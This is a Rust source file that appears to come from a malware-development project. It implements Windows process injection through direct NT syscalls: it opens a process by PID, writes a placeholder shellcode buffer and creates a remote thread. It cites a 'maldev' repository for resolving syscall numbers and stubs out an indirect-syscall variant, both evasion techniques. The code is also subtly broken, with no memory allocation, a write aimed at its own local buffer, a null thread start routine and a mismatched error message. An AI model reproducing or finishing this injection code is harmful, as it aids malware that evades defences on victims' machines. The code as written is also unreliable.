use ntapi::ntpsapi::PS_ATTRIBUTE_LIST;
use std::{
    ffi::c_void,
    io::{Error, ErrorKind},
};
use windows::{
    core::{HSTRING, PCSTR},
    Wdk::{
        Foundation::{NtClose, OBJECT_ATTRIBUTES},
        System::{
            SystemServices::NtOpenProcess,
            Threading::NtWaitForSingleObject,
        },
    },
    Win32::{
        Foundation::{HANDLE, HMODULE, NTSTATUS, STATUS_SUCCESS},
        System::{
            LibraryLoader::{GetProcAddress, GetModuleHandleW},
            Threading::{PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS},
            WindowsProgramming::CLIENT_ID,
        },
    },
};

use super::ntdll::{
    NtCreateThreadEx,
    NtWriteVirtualMemory,
};

// Get DLLs
fn get_dll(dll_name: HSTRING) -> Result<HMODULE, Error> {
    let hdll: HMODULE = unsafe {
        match GetModuleHandleW(&dll_name) {
            Ok(h) => h,
            Err(e) => {
                return Err(Error::new(ErrorKind::Other, format!("{}", e.to_string())));
            }
        }
    };
    Ok(hdll)
}

// Get SSNs for NtFunctions
// Reference:
//  https://github.com/cr-0w/maldev/blob/main/Process%20Injection/Direct%20Syscalls/syscalls.c#L40
// fn get_ssn(hntdll: HMODULE, ntfunc: PCSTR) -> Result<*const u8, Error> {
//     let ntfunc_addr = unsafe {
//         match GetProcAddress(hntdll, ntfunc) {
//             Some(p) => p,
//             None => {
//                 return Err(Error::new(ErrorKind::Other, "The address not found."));
//             }
//         }
//     };

//     // let ntfunc_ssn = ((&ntfunc_addr as *const _) + 4);
//     let ntfunc_ssn = *((ntfunc_addr as *const u8).offset(4) as *const u8);
//     Ok(ntfunc_ssn)
// }

pub fn direct_syscalls(pid: u64) -> Result<(), Error> {
    let shellcode: [u8; 4] = [0xDE, 0xAD, 0xBE, 0xEF];

    // let mut oa= OBJECT_ATTRIBUTES {
    //     Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
    //     RootDirectory: null_mut(),
    //     ObjectName: null_mut(),
    //     Attributes: 0,
    //     SecurityDescriptor: null_mut(),
    //     SecurityQualityOfService: null_mut(),
    // };
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut cid = CLIENT_ID {
        UniqueProcess: HANDLE(pid as isize),
        UniqueThread: HANDLE(0),
    };

    // Get syscalls
    // let hntdll = get_dll(HSTRING::from("NTDLL")).unwrap();
    // let ntopenprocess_ssn = get_ssn(
    //     hntdll.clone(), &HSTRING::from("NtAllocateVirtualMemory"));
    // let ntallocatevirtualmemory_ssn = get_ssn(
    //     hntdll.clone(), &HSTRING::from("NtAllocateVirtualMemory"));
    // let ntwritevirtualmemory_ssn = get_ssn(
    //     hntdll.clone(), &HSTRING::from("NtWriteVirtualMemory"));
    // let ntcreatethreadex_ssn = get_ssn(
    //     hntdll.clone(), &HSTRING::from("NtCreateThreadEx"));
    // let ntwaitforsingleobject_ssn = get_ssn(
    //     hntdll.clone(), &HSTRING::from("NtWaitForSingleObject"));
    // let ntclose_ssn = get_ssn(hntdll.clone(), &HSTRING::from("NtClose"));

    // Injection
    // let mut hprocess: *mut HANDLE = std::ptr::null_mut();
    // let mut hthread: *mut HANDLE = std::ptr::null_mut();
    let mut hprocess = HANDLE::default();
    let mut hthread = HANDLE::default();

    let desired_access = 0;
    
    let status: NTSTATUS = unsafe {
        NtOpenProcess(
            &mut hprocess,
            desired_access,
            &mut oa,
            Some(&mut cid),
        )
    };

    if status != STATUS_SUCCESS {
        close_nt_handles(hprocess, hthread);
        return Err(Error::new(ErrorKind::Other, "Failted to allocate memory."));
    }

    let mut bytes_written: u64 = 0;
    let mut buffer: [u8; 4] = [0; 4];
    let mut buffer_ptr = buffer.as_mut_ptr();
    let mut bytes_written_ptr = &mut bytes_written as *mut u64;
    let status = unsafe {
        NtWriteVirtualMemory(
            &mut hprocess,
            &mut buffer_ptr as *mut _ as u64,
            &mut buffer_ptr as *mut _ as u64,
            4,
            &mut bytes_written_ptr as *mut _ as u64,
        )
    };

    if status != STATUS_SUCCESS {
        close_nt_handles(hprocess, hthread);
        return Err(Error::new(ErrorKind::Other, "Failed to write virtual memory."));
    }

    // let start_routine = Some(somefunc).unwrap() as *mut c_void;
    let start_routine = std::ptr::null_mut();
    let argument = std::ptr::null_mut();
    let create_flags = 0;
    let zero_bits = 0;
    let stack_size = 0;
    let max_stack_size = 0;
    let attribute_list: *mut PS_ATTRIBUTE_LIST = std::ptr::null_mut();

    let status = unsafe {
        NtCreateThreadEx(
            &mut hthread,
            desired_access,
            &mut oa,
            hprocess,
            start_routine,
            argument,
            create_flags,
            zero_bits,
            stack_size,
            max_stack_size,
            attribute_list,
        )
    };

    if status != STATUS_SUCCESS {
        close_nt_handles(hprocess, hthread);
        return Err(Error::new(ErrorKind::Other, "Failed to create thread."));
    }

    let status = unsafe {
        NtWaitForSingleObject(
            hthread,
            false,
            0 as *mut i64,
        )
    };

    if status != STATUS_SUCCESS {
        close_nt_handles(hprocess, hthread);
        return Err(Error::new(ErrorKind::Other, "Failed to wait for object (hthread)."));
    }

    match close_nt_handles(hprocess, hthread) {
        Ok(_) => Ok(()),
        Err(e) => Err(Error::new(ErrorKind::Other, e.to_string())),
    }
}

// pub fn indirect_syscalls(pid: u64) -> Result<(), Error> {

// }

fn close_nt_handles(hprocess: HANDLE, hthread: HANDLE) -> Result<(), Error> {
    // Close process handle
    let status = unsafe { NtClose(hprocess) };
    if status != STATUS_SUCCESS {
        return Err(Error::new(ErrorKind::Other, "Failed to close the process handle."));
    }

    // Close thread handle
    let status = unsafe { NtClose(hthread) };
    if status != STATUS_SUCCESS {
        return Err(Error::new(ErrorKind::Other, "Failed to close the thread handle."));
    }

    Ok(())
}